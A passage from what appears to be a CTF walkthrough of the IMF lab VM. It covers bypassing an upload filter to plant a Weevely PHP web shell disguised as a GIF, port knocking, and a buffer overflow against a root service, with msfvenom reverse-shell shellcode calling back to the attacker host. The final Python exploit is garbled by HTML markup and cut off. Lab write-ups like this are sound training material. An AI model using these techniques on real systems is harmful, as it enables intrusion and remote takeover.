+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | pagename             | pagedata                                                                                                                                                              |
+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | upload               | Under Construction.                                                                                                                                                   |
| 2  | home                 | Welcome to the IMF Administration.                                                                                                                                    |
| 3  | tutorials-incomplete | Training classrooms available. &lt;br /&gt;&lt;img src="./images/whiteboard.jpg"&gt;&lt;br /&gt; Contact us for training.                                                               |
| 4  | disavowlist          | &lt;h1&gt;Disavowed List&lt;/h1&gt;&lt;img src="./images/redacted.jpg"&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;*********&lt;/li&gt;&lt;li&gt;****** ******&lt;/li&gt;&lt;li&gt;*******&lt;/li&gt;&lt;li&gt;**** ********&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;-Secretary |
+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
</code></p>

<p>The admin DB contains a table with the pages that we&rsquo;ve seen in the CMS, but it looks like there&rsquo;s an extra page we didn&rsquo;t know about! Let&rsquo;s see it!</p>

<p><img class="center" src="/images/pentest/imf/tutorials.png" title="&lsquo;tutorials&rsquo; &lsquo;tutorials&rsquo;" ></p>

<p>I used an online barcode reader for the QR code which revealed the flag: <em>flag4{dXBsb2Fkcjk0Mi5waHA=}</em>. And the next hint is <code>uploadr942.php</code></p>

<h1>Flag #5 &ndash; PHP shell upload</h1>

<p>Going to <a href="http://192.168.145.130/imfadministrator/uploadr942.php">http://192.168.145.130/imfadministrator/uploadr942.php</a> takes us to an upload form:</p>

<p><img class="center" src="/images/pentest/imf/upload.jpg" title="&lsquo;upload&rsquo; &lsquo;upload&rsquo;" ></p>

<p>Attempting to directly upload a PHP shell fails with an invalid file extension message. Then I tried a GIF downloaded from the internet, but another error, that the file is too large. So I just created a makeshift file with the GIF89 magic number and uploaded it with no problems. There was no mention of where ig might be located, but in the source code of the page now appeared a HTML comment:</p>

<p>```</p>

<!-- d8988628c59f -->


<p>```</p>

<p>I tried putting that in the URL with a GIF extension, but that was a no-go. So I fired up dirb to see if there are any other directories under imfadministrator:</p>

<p>```
root@kali:/usr/share/wordlists/dirb# dirb <a href="http://192.168.145.130/imfadministrator/">http://192.168.145.130/imfadministrator/</a> common.txt</p>

<p>&mdash;&mdash; Scanning URL: <a href="http://192.168.145.130/imfadministrator/">http://192.168.145.130/imfadministrator/</a> &mdash;&mdash;
==> DIRECTORY: <a href="http://192.168.145.130/imfadministrator/images/">http://192.168.145.130/imfadministrator/images/</a>               <br/>
+ <a href="http://192.168.145.130/imfadministrator/index.php">http://192.168.145.130/imfadministrator/index.php</a> (CODE:200|SIZE:337)      <br/>
==> DIRECTORY: <a href="http://192.168.145.130/imfadministrator/uploads/">http://192.168.145.130/imfadministrator/uploads/</a>      <br/>
```</p>

<p>Awesome, it found and uploads directory. This time I appended the previous name to this new path and it found my GIF file. So the next thing was to repeat the process of a previous challenge and try uploading a PHP shell disguised as a GIF image. But today I decided to experiment with a different type of shell.</p>

<h2>TTP breakdown &ndash; Weevely Weaponized web shell</h2>

<p>Homepage: <a href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></p>

<p><strong>Description</strong></p>

<blockquote><p>Weevely is a web shell designed for post-exploitation purposes that can be extended over the
network at runtime.</p>

<p>Upload weevely PHP agent to a target web server to get remote shell access to it. It has more than
30 modules to assist administrative tasks, maintain access, provide situational awareness, elevate
privileges, and spread into the target network.</p>

<p>Features</p>

<p>   Shell access to the target</p>

<p>   SQL console pivoting on the target</p>

<p>   HTTP/HTTPS proxy to browse through the target</p>

<p>   Upload and download files</p>

<p>   Spawn reverse and direct TCP shells</p>

<p>   Audit remote target security</p>

<p>   Run Meterpreter payloads</p>

<p>   Port scan pivoting on target</p>

<p>   Mount the remote filesystem</p>

<p>   Bruteforce SQL accounts pivoting on the target</p>

<p>Agent</p>

<p>The agent is a small, polymorphic PHP script hardly detected by AV and the communication protocol
is obfuscated within HTTP requests.</p></blockquote>

<p>First, I installed Weevely on my machine by cloning its git repository and installing the requirements:</p>

<p>```
root@kali:/opt/weevely3# apt-get install g++ python2.7 python-pip libyaml-dev python-dev libncurses5-dev</p>

<p>root@kali:/opt/weevely3# pip install -r requirements.txt &mdash;upgrade
```</p>

<p>Then I ran the Weevely client:</p>

<p>```
root@kali:/opt/weevely3# ./weevely.py</p>

<p>[+] weevely 3.6.2
[!] Error: too few arguments</p>

<p>[+] Run terminal or command on the target</p>

<pre><code>weevely &lt;URL&gt; &lt;password&gt; [cmd]
</code></pre>

<p>[+] Recover an existing session</p>

<pre><code>weevely session &lt;path&gt; [cmd]
</code></pre>

<p>[+] Generate new agent</p>

<pre><code>weevely generate &lt;password&gt; &lt;path&gt;
</code></pre>

<p>```</p>

<p>We need to generate the agent that we&rsquo;ll actually upload to the target server:</p>

<p><code>
./weevely.py generate securepass harmless.php
Generated 'harmless.php' with password 'securepass' of 695 byte size.
</code></p>

<p>I appended the GIF magic number at the beginning and changed the extension to GIF and successfully uploaded the shell. Then I connected to it with the Weevely client:</p>

<p>```
./weevely.py <a href="http://192.168.145.130/imfadministrator/uploads/c2fff7999be7.gif">http://192.168.145.130/imfadministrator/uploads/c2fff7999be7.gif</a> securepass</p>

<p>[+] weevely 3.6.2</p>

<p>[+] Target: 192.168.145.130
[+] Session:    /root/.weevely/sessions/192.168.145.130/c2fff7999be7_0.session</p>

<p>[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.</p>

<p>weevely> :help</p>

<p> :audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess.   <br/>
 :audit_phpconf                Audit PHP configuration.                                           <br/>
 :audit_suidsgid               Find files with SUID or SGID flags.                                <br/>
 :audit_filesystem             Audit the file system for weak permissions.                        <br/>
 :audit_etcpasswd              Read /etc/passwd with different techniques.                        <br/>
 :shell_php                    Execute PHP commands.                                              <br/>
 :shell_sh                     Execute shell commands.                                            <br/>
 :shell_su                     Execute commands with su.                                          <br/>
 :system_extensions            Collect PHP and webserver extension list.                          <br/>
 :system_info                  Collect system information.                                        <br/>
 :system_procs                 List running processes.                                            <br/>
 :backdoor_reversetcp          Execute a reverse TCP shell.                                       <br/>
 :backdoor_meterpreter         Start a meterpreter session.                                       <br/>
 :backdoor_tcp                 Spawn a shell on a TCP port.                                       <br/>
 :bruteforce_sql               Bruteforce SQL database.                                           <br/>
 :file_upload2web              Upload file automatically to a web folder and get corresponding URL.
 :file_upload                  Upload file to remote filesystem.                                  <br/>
 :file_read                    Read remote file from the remote filesystem.                       <br/>
 :file_cp                      Copy single file.                                                  <br/>
 :file_clearlog                Remove string from a file.                                         <br/>
 :file_gzip                    Compress or expand gzip files.                                     <br/>
 :file_tar                     Compress or expand tar archives.                                   <br/>
 :file_enum                    Check existence and permissions of a list of paths.                <br/>
 :file_ls                      List directory content.                                            <br/>
 :file_check                   Get attributes and permissions of a file.                          <br/>
 :file_find                    Find files with given names and attributes.                        <br/>
 :file_download                Download file from remote filesystem.                              <br/>
 :file_rm                      Remove remote file.                                                <br/>
 :file_touch                   Change file timestamp.                                             <br/>
 :file_cd                      Change current working directory.                                  <br/>
 :file_webdownload             Download an URL.                                                   <br/>
 :file_mount                   Mount remote filesystem using HTTPfs.                              <br/>
 :file_grep                    Print lines matching a pattern in multiple files.                  <br/>
 :file_zip                     Compress or expand zip files.                                      <br/>
 :file_bzip2                   Compress or expand bzip2 files.                                    <br/>
 :file_edit                    Edit remote file on a local editor.                                <br/>
 :sql_dump                     Multi dbms mysqldump replacement.                                  <br/>
 :sql_console                  Execute SQL query or run console.                                  <br/>
 :net_phpproxy                 Install PHP proxy on the target.                                   <br/>
 :net_curl                     Perform a curl-like HTTP request.                                  <br/>
 :net_mail                     Send mail.                                                         <br/>
 :net_proxy                    Run local proxy to pivot HTTP/HTTPS browsing through the target.   <br/>
 :net_ifconfig                 Get network interfaces addresses.                                  <br/>
 :net_scan                     TCP Port scan.</p>

<p>The system shell interpreter is not available in this session, use the
following command replacements to simulate a unrestricted shell.</p>

<p> touch                                      file_touch     <br/>
 whoami, hostname, pwd, uname               system_info    <br/>
 gzip, gunzip                               file_gzip      <br/>
 mail                                       net_mail       <br/>
 curl                                       net_curl       <br/>
 zip, unzip                                 file_zip       <br/>
 nmap                                       net_scan       <br/>
 cd                                         file_cd        <br/>
 rm                                         file_rm        <br/>
 ps                                         system_procs   <br/>
 cat                                        file_read      <br/>
 ifconfig                                   shell_su       <br/>
 vi, vim, emacs, nano, pico, gedit, kwrite  file_edit      <br/>
 wget                                       file_webdownload
 find                                       file_find      <br/>
 tar                                        file_tar       <br/>
 ifconfig                                   net_ifconfig   <br/>
 bzip2, bunzip2                             file_bzip2     <br/>
 ls, dir                                    file_ls        <br/>
 cp, copy                                   file_cp        <br/>
 grep                                       file_grep<br/>
```</p>

<p>Now let&rsquo;s use it to poke around:</p>

<p><code>
weevely&gt; whoami
www-data
www-data@imf:/var/www/html/imfadministrator/uploads $ :system_info
+--------------------+-------------------------------------------------------------------------------+
| client_ip          | 192.168.145.129                                                               |
| max_execution_time | 30                                                                            |
| script             | /imfadministrator/uploads/c2fff7999be7.gif                                    |
| open_basedir       |                                                                               |
| hostname           | imf                                                                           |
| php_self           | /imfadministrator/uploads/c2fff7999be7.gif                                    |
| script_folder      | /var/www/html/imfadministrator/uploads                                        |
| uname              | Linux imf 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 |
| pwd                | /var/www/html/imfadministrator/uploads                                        |
| safe_mode          | False                                                                         |
| php_version        | 7.0.32-0ubuntu0.16.04.1                                                       |
| dir_sep            | /                                                                             |
| os                 | Linux                                                                         |
| whoami             | www-data                                                                      |
| document_root      | /var/www/html                                                                 |
+--------------------+-------------------------------------------------------------------------------+
</code></p>

<p>Listing the files in the current directory gives us the fifth flag!</p>

<p>```
www-data@imf:/var/www/html/imfadministrator/uploads $ ls -alh
total 28K
drwxr-xr-x 2 www-data www-data 4.0K Oct  7 07:29 .
drwxr-xr-x 4 www-data www-data 4.0K Oct 17  2016 ..
-rw-r&mdash;r&mdash; 1 www-data www-data   82 Oct 12  2016 .htaccess
-rw-r&mdash;r&mdash; 1 www-data www-data  701 Oct  7 07:29 c2fff7999be7.gif
-rw-r&mdash;r&mdash; 1 www-data www-data   30 Oct  7 07:03 c72ad31b04e6.gif
-rw-r&mdash;r&mdash; 1 www-data www-data   30 Oct  7 06:47 d8988628c59f.gif
-rw-r&mdash;r&mdash; 1 www-data www-data   28 Oct 12  2016 flag5_abc123def.txt</p>

<p>$ cat flag5_abc123def.txt
flag5{YWdlbnRzZXJ2aWNlcw==}
```</p>

<p>The decoded hint is <code>agentservices</code></p>

<h1>Flag #6 &ndash; Binary exploitation</h1>

<p>I ran a search on the filesystem for files with agent in their name and got 2 hits:</p>

<p><code>
find / -type f -name agent*
/usr/local/bin/agent
/etc/xinetd.d/agent
</code></p>

<p>Interestingly, it seems there is an agent server around:</p>

<p>```
cat /etc/xinetd.d/agent</p>

<h1>default: on</h1>

<h1>description: The agent server serves agent sessions</h1>

<h1>unencrypted agentid for authentication.</h1>

<p>service agent
{</p>

<pre><code>   flags          = REUSE
   socket_type    = stream
   wait           = no
   user           = root
   server         = /usr/local/bin/agent
   log_on_failure += USERID
   disable        = no
   port           = 7788
</code></pre>

<p>}
```</p>

<p>So it seems the agent service is listening on port 7788 and running as root:</p>

<p><code>
netstat -lnt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:7788            0.0.0.0:*               LISTEN  
</code></p>

<p>Next I went to <code>/usr/local/bin</code> where the executable is located:</p>

<p>```
./agent</p>

<hr />

<p> |<em> </em>|  \/  | <strong>|  Agent
  | || |\/| | <em>|   Reporting
 |</em></strong>|<em>|  |</em>|_|    System</p>

<p>Agent ID :
```</p>

<p>We need to give it a valid agent ID for authentication. Inside the folder there is also another file:</p>

<p><code>
www-data@imf:/usr/local/bin $ cat access_codes
SYN 7482,8279,9467
</code></p>

<p>Looks like a port knocking sequence. I borrowed from an example on <a href="https://wiki.archlinux.org/index.php/Port_knocking">ArchLinux wiki</a></p>

<p><code>
for port in 7482 8279 9467; do nmap -Pn --host-timeout 100 --max-retries 0 -p $port 192.168.145.130; done
</code></p>

<p>And when I ran Nmap again, I found port 7788 is now open to the public:</p>

<p><code>
PORT     STATE SERVICE
7788/tcp open  unknown
</code></p>

<p>Connecting to it takes us to the agent prompt where we have to put the agent ID. I downloaded the agent executable on my system for GDB:</p>

<p><code>
www-data@imf:/usr/local/bin $ :file_download agent /root/agent
</code></p>

<p>Running strings on it also gives some interesting infomation about extraction points. Anyway, back to the agent ID. In the strings I saw a call to <strong>strncmp</strong>, so when running the executable I set up a breakpoint on main, then ran the program, set a breakpoint to strncmp and gave it some input. Doing so, I noticed what appears to be a hardcoded value in the comparison:</p>

<p><code>
0000| 0xffffd32c --&gt; 0x80486bf (&lt;main+196&gt;: add    esp,0x10)
0004| 0xffffd330 --&gt; 0xffffd34e ("1234\n")
0008| 0xffffd334 --&gt; 0x804c1d0 ("48093572")
0012| 0xffffd338 --&gt; 0x8
0016| 0xffffd33c --&gt; 0xf7de4e6b (add    esp,0x10)
0020| 0xffffd340 --&gt; 0xf7f8a3fc --&gt; 0xf7f8b200 --&gt; 0x0
0024| 0xffffd344 --&gt; 0x0
0028| 0xffffd348 --&gt; 0x804c1d0 ("48093572")
</code></p>

<p>I used 48093572 as the agent ID and it worked and took me to a menu:</p>

<p>```
nc -vn 192.168.145.130 7788
(UNKNOWN) [192.168.145.130] 7788 (?) open</p>

<hr />

<p> |<em> </em>|  \/  | <strong>|  Agent
  | || |\/| | <em>|   Reporting
 |</em></strong>|<em>|  |</em>|_|    System</p>

<p>Agent ID : 48093572
Login Validated
Main Menu:
1. Extraction Points
2. Request Extraction
3. Submit Report
0. Exit
Enter selection: 1</p>

<p>Extraction Points:
Staatsoper, Vienna, Austria
Blenheim Palace, Woodstock, Oxfordshire, England, UK
Great Windmill Street, Soho, London, England, UK
Fawley Power Station, Southampton, England, UK
Underground Station U4 Schottenring, Vienna, Austria
Old Town Square, Old Town, Prague, Czech Republic
Drake Hotel &ndash; 140 E. Walton Pl., Near North Side, Chicago, Illinois, USA
Ashton Park, Mosman, Sydney, New South Wales, Australia
Argyle Place, The Rocks, Sydney, New South Wales, Australia</p>

<p>Enter selection: 2</p>

<p>Extraction Request
Enter extraction location: Vienna</p>

<p>Location: Vienna</p>

<p>Extraction team has been deployed.</p>

<p>Enter selection: 3</p>

<p>Enter report update: Abort extraction
Report: Abort extraction
Submitted for review.
```</p>

<p>Interesting. The 3rd option is the one that appears to take a variable amount of input, so maybe there&rsquo;s a buffer overflow lurking around. It&rsquo;s been a while since I&rsquo;ve done any binary exploitation. First thing, creating the pattern that might crash the service:</p>

<p><code>
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
</code></p>

<p>I used the above string for the report and the program did crash:</p>

<p>```
Program received signal SIGSEGV, Segmentation fault.</p>

<p>[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
EAX: 0xffffd294 (&ldquo;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af\224\322\377\377Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&rdquo;&hellip;)
EBX: 0x0
ECX: 0xf7f8adc7 &mdash;> 0xf8b8900a
EDX: 0xf7f8b890 &mdash;> 0x0
ESI: 0xf7f8a000 &mdash;> 0x1d5d8c
EDI: 0x0
EBP: 0x35664134 (&lsquo;4Af5&rsquo;)
ESP: 0xffffd340 (&ldquo;f7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3&rdquo;&hellip;)
EIP: 0x41366641 (&lsquo;Af6A&rsquo;)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-code&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
Invalid $PC address: 0x41366641
```</p>

<p>With my binary exploitation skills unused in a long time, I had to revisit some topics and also take a look at how others solved this. Moving on, a couple of interesting things, EIP gets overwritten by Af6A, which appears at offset 168 of the payload:</p>

<p><code>
./pattern_offset.rb -q Af6A -l 1000
[*] Exact match at offset 168
</code></p>

<p>However, if we look at EAX, we see our pattern from the beginning. Which means that if we had some shellcode instead of the pattern, it would get stored in EAX, and to execute it we would need a JMP or a CALL instruction to EAX. Luckily, there&rsquo;s one available!</p>

<p><code>
gdb-peda$ jmpcall eax
0x8048563 : call eax
</code></p>

<p>Now, for the shellcode part. The way of feeding it to the vulnerable program will be using a Python script. I chose a reverse TCP shell for the payload and avoided badchars like nulls and newlines (line feeds and carriage returns):</p>

<p><code>
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.145.129 LPORT=8888 -f python -o killagent.py -b "\x00\x0a\x0d"
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of python file: 470 bytes
Saved as: killagent.py
</code></p>

<p>The payload size is 95 bytes:</p>

<p><code>
cat killagent.py
buf =  ""
buf += "\xbb\x6e\x01\x4b\xcb\xdb\xcc\xd9\x74\x24\xf4\x5e\x31"
buf += "\xc9\xb1\x12\x31\x5e\x12\x03\x5e\x12\x83\xa8\x05\xa9"
buf += "\x3e\x05\xdd\xda\x22\x36\xa2\x77\xcf\xba\xad\x99\xbf"
buf += "\xdc\x60\xd9\x53\x79\xcb\xe5\x9e\xf9\x62\x63\xd8\x91"
buf += "\xb4\x3b\x8b\xe0\x5d\x3e\xac\xc0\x25\xb7\x4d\xb4\x30"
buf += "\x98\xdc\xe7\x0f\x1b\x56\xe6\xbd\x9c\x3a\x80\x53\xb2"
buf += "\xc9\x38\xc4\xe3\x02\xda\x7d\x75\xbf\x48\x2d\x0c\xa1"
buf += "\xdc\xda\xc3\xa2"
</code></p>

<p>Under these conditions, we would need to send a buffer of the shellcode + padding + the address of the CALL EAX instruction. Let&rsquo;s see the Python:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">socket</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">target</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">145.130</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">7788</span>
</span><span class='line'><span class="n">agentid</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">48093572</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">menu</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">3</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">linux</span><span class="o">/</span><span class="n">x86</span><span class="o">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">145.129</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">8888</span> <span class="o">-</span><span class="n">f</span> <span class="n">python</span> <span class="o">-</span><span class="n">o</span> <span class="n">killagent</span><span class="o">.</span><span class="n">py</span> <span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span><span class="c"># b &amp;ldquo;\x00\x0a\x0d&amp;rdquo;&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Size</span><span class="p">:</span> <span class="mi">95</span> <span class="nb">bytes</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">buf</span> <span class="o">=</span>  <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xbb</span>\<span class="n">x6e</span>\<span class="n">x01</span>\<span class="n">x4b</span>\<span class="n">xcb</span>\<span class="n">xdb</span>\<span class="n">xcc</span>\<span class="n">xd9</span>\<span class="n">x74</span>\<span class="n">x24</span>\<span class="n">xf4</span>\<span class="n">x5e</span>\<span class="n">x31</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc9</span>\<span class="n">xb1</span>\<span class="n">x12</span>\<span class="n">x31</span>\<span class="n">x5e</span>\<span class="n">x12</span>\<span class="n">x03</span>\<span class="n">x5e</span>\<span class="n">x12</span>\<span class="n">x83</span>\<span class="n">xa8</span>\<span class="n">x05</span>\<span class="n">xa9</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x3e</span>\<span class="n">x05</span>\<span class="n">xdd</span>\<span class="n">xda</span>\<span class="n">x22</span>\<span class="n">x36</span>\<span class="n">xa2</span>\<span class="n">x77</span>\<span class="n">xcf</span>\<span class="n">xba</span>\<span class="n">xad</span>\<span class="n">x99</span>\<span class="n">xbf</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xdc</span>\<span class="n">x60</span>\<span class="n">xd9</span>\<span class="n">x53</span>\<span class="n">x79</span>\<span class="n">xcb</span>\<span class="n">xe5</span>\<span class="n">x9e</span>\<span class="n">xf9</span>\<span class="n">x62</span>\<span class="n">x63</span>\<span class="n">xd8</span>\<span class="n">x91</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xb4</span>\<span class="n">x3b</span>\<span class="n">x8b</span>\<span class="n">xe0</span>\<span class="n">x5d</span>\<span class="n">x3e</span>\<span class="n">xac</span>\<span class="n">xc0</span>\<span class="n">x25</span>\<span class="n">xb7</span>\<span class="n">x4d</span>\<span class="n">xb4</span>\<span class="n">x30</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x98</span>\<span class="n">xdc</span>\<span class="n">xe7</span>\<span class="n">x0f</span>\<span class="n">x1b</span>\<span class="n">x56</span>\<span class="n">xe6</span>\<span class="n">xbd</span>\<span class="n">x9c</span>\<span class="n">x3a</span>\<span class="n">x80</span>\<span class="n">x53</span>\<span class="n">xb2</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
